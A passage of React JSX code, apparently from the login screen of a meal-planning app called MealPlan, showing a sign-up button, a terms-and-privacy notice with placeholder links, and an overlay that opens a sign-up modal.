            <button onClick={() => setShowSignUp(true)}
              style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, textDecoration: "underline", padding: 0 }}>
              Sign up
            </button>
          </div>

          <p style={{ marginTop: 12, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
            By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676" }}>Terms of Service</a> and <a href="#" style={{ color: "#767676" }}>Privacy Policy</a>. <a href="#" style={{ color: "#767676" }}>Notice at collection</a>.
          </p>
        </div>
      </div>

      {/* Sign up overlay */}
      {showSignUp && (
        <>
          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 29 }} onClick={() => setShowSignUp(false)} />
          <SignUpModal onClose={() => setShowSignUp(false)} />
        </>
      )}
    </div>
  );
}